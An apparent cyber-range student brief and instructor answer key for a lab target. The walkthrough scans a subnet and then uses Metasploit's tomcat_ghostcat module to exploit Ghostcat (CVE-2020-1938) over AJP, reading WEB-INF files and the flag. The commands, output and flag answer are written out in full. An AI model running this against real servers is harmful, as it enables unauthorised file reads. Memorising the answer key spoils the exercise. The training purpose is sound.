# Austin Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.16.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Austin.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.
# Austin — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.16.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Austin|
|Assigned subnet|`192.168.16.0/24`|
|Deploy flag key|`T7_FLAG`|
|Default flag|`golden-cobra`|
|Flag location on target|`/flag.txt` after access|

Rotate `T7_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.16.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.16.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Austin Module (`B02.M11`). Students know only the assigned subnet `192.168.16.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.16.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T7_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `curl` (for HTTP enumeration and the WEB-INF baseline)
- `metasploit-framework` (section 4 automated path via `auxiliary/admin/http/tomcat_ghostcat`)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.16.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.16.10
```

_Output:_

```
192.168.16.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.16.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.16.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.16.10
Host is up.
Nmap scan report for 192.168.16.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.16.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.16.10**.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.16.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.16.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. We need product names, not just open ports (here, **Tomcat 9.0.30** and **ajp13**).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. AJP on **8009** is outside the top-1000 set on some lists; a default port scan can miss it.

_Output excerpt:_

```
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

**Observation:** Two open ports — **8080/tcp** (Apache Tomcat 9.0.30 over HTTP) and **8009/tcp** (AJP 1.3 / Apache JServ).

**Inference:** 8080 is the usual Tomcat HTTP face. 8009 is **not** a second website. Confirm the HTTP title, then look up what AJP is.

#### Initial Web Probing

nmap told us HTTP on **8080**. Confirm Tomcat in the HTTP conversation: headers first, then the page title.

```
curl -s -D - http://192.168.16.10:8080/ -o /tmp/t7-root.html | head -12
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter.
- `-D -` — write response **headers** to stdout.
- `-o /tmp/t7-root.html` — write the **body** to a file.
- `| head -12` — only the first header lines.
- Use **`:8080`** because that is the HTTP listener nmap found (not 80).

_Header excerpt:_

```
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
```

```
grep -i '<title>' /tmp/t7-root.html
```

_Why `title`:_ the default Tomcat welcome page puts the version in `<title>`. We are confirming nmap’s **Apache Tomcat 9.0.30**, not hunting a CMS.

_Body excerpt:_

```
<title>Apache Tomcat/9.0.30</title>
```

**Observation:** Default Tomcat welcome page confirms **Apache Tomcat/9.0.30**.

**Inference:** The interesting second port is still 8009. Searching `Tomcat AJP 8009` lands on Tomcat’s AJP connector docs — AJP commonly listens on **8009** ([Apache Tomcat 9 AJP Connector](https://tomcat.apache.org/tomcat-9.0-doc/config/ajp.html)).

**What AJP is:** Apache JServ Protocol is a **binary** protocol meant for a reverse proxy (httpd, nginx) to talk to Tomcat. It is not HTTP. `curl http://…:8009/` will not speak it. An older Tomcat with AJP exposed to the network is the research lead for Ghostcat.

AJP is binary. A short `curl` against 8009 only proves it is not HTTP:

```
curl -s --max-time 3 http://192.168.16.10:8009/ | head -c 80 | xxd
```

_`--max-time 3`_ — do not hang if the binary protocol never completes an HTTP response.

You should see non-HTTP bytes, not an HTML Tomcat page.

At this point we know:

- **Apache Tomcat 9.0.30** on HTTP port 8080
- **AJP 1.3** listening on port 8009 (not HTTP)

### 3. Vulnerability Discovery

Searching from those facts — `Tomcat AJP 8009 file read` or `Tomcat 9.0.30 AJP vulnerability` — surfaces **Ghostcat (CVE-2020-1938)**, originally published by Chaitin Tech ([Ghostcat advisory](https://www.chaitin.cn/en/ghostcat)) and tracked for Tomcat 9.0.0.M1 through **9.0.30** ([CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)). This host is 9.0.30 — last version in that window. Vulhub: `vulnhub/tomcat/CVE-2020-1938/README.md`.

**What the bug is:** Ghostcat is not `../` on HTTP. An attacker who can speak AJP sets servlet **include** attributes:

```
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
```

Tomcat then treats the request like `RequestDispatcher.include()`: an **internal** fetch of a resource **inside the deployed web application** (here, the ROOT app under Tomcat’s `webapps/ROOT/`). HTTP never uses that include path, so files Tomcat hides from GET can still be read over AJP.

**Why public PoCs start with `/WEB-INF/web.xml`:** `WEB-INF/` is part of the webapp. The servlet spec / Tomcat **refuses to serve it as static HTTP** ([Tomcat: Deployment](https://tomcat.apache.org/tomcat-9.0-doc/deployer-howto.html)). `web.xml` is the standard descriptor in that directory. Metasploit’s `tomcat_ghostcat` default `FILENAME` is `/WEB-INF/web.xml` ([module docs](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/admin/http/tomcat_ghostcat.md)). HTTP 404 + AJP success is a clean proof.

#### Baseline: HTTP cannot read `WEB-INF`

```
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  http://192.168.16.10:8080/WEB-INF/web.xml
```

- `-o /dev/null` — discard the body; we only care about the status.
- `-w "HTTP %{http_code}\n"` — print the HTTP status code (`404` vs `200`).

_Output:_

```
HTTP 404
```

**Observation:** GET `/WEB-INF/web.xml` over HTTP is **404**.

**Inference:** If AJP returns that same file, we have Ghostcat’s include/read primitive. That check is section 4 (an AJP-aware client — not `curl`).

### 4. Automated Path: Metasploit `tomcat_ghostcat`

Kali ships Metasploit. Search after Tomcat + AJP:

```
msf6 > search ghostcat

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  No     Apache Tomcat AJP File Read/Inclusion
```

This is **`auxiliary/`**, not `exploit/`. It reads files over AJP; it does not open a shell.

```
msfconsole -q
```

```
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 192.168.16.10
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8009
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/web.xml
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

_`RPORT 8009`_ is the AJP port nmap found, not 8080. _`FILENAME /WEB-INF/web.xml`_ is the public proof file from section 3.

_Output excerpt:_

```
[*] Running module against 192.168.16.10
<?xml version="1.0" encoding="UTF-8"?>
...
  <display-name>Welcome to Tomcat</display-name>
...
[+] 192.168.16.10:8009 - File contents save to: .../WEBINFweb.xml_....txt
```

**Observation:** The file HTTP refused is readable through AJP.

**Inference:** **CVE-2020-1938 (Ghostcat)** is confirmed. Stay on file read for the flag (section 5). There is no stock Ghostcat shell module, and this lab has no upload to plant a JSP.

### 5. Flag via the same AJP include (no shell)

#### Why this is not “whatever path we try”

The include is resolved **inside the web application**, as a servlet resource path (under `webapps/ROOT/` on this image), not as an arbitrary OS path.

|Path you ask AJP to include|What Tomcat looks up|Result|
|---|---|---|
|`/WEB-INF/web.xml`|`ROOT/WEB-INF/web.xml` (inside the app)|Readable — section 4|
|`/etc/passwd`|not a resource in ROOT|fail / HTTP 500|
|`/flag.txt` (container root)|not a resource in ROOT|same fail|

The include can read webapp files. It cannot walk off the webapp into the host filesystem. Prove that miss before looking for another file:

```
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /etc/passwd
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

_Output excerpt:_

```
<!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title>...
Message: The requested resource [index] is not available
[-] 192.168.16.10:8009 - Unable to read file, target may not be vulnerable.
[+] 192.168.16.10:8009 - File contents save to: .../etcpasswd_....txt
```

The saved loot file is that 500 page, not `/etc/passwd`. A `[+] File contents save to` line on this miss does not mean the read succeeded.

`/flag.txt` at the filesystem root fails the same way. The include only sees webapp files. `web.xml` already proved `WEB-INF/` is readable, and HTTP will not serve that directory. The flag is an obvious file once you can read it, so try `flag.txt` beside the `web.xml` that just worked:

```
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/flag.txt
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

_Output:_

```
[*] Running module against 192.168.16.10
golden-cobra
[+] 192.168.16.10:8009 - File contents save to: .../WEBINFflag.tx_....txt
```

That read is `/usr/local/tomcat/webapps/ROOT/WEB-INF/flag.txt`, the same tree as `web.xml`.

Target 7 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.16.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the recovered string does not match this table, read the live `T7_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.16.0/24`. The ops-station address can change with DHCP; take it from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.16.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T7_FLAG` (default `golden-cobra`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.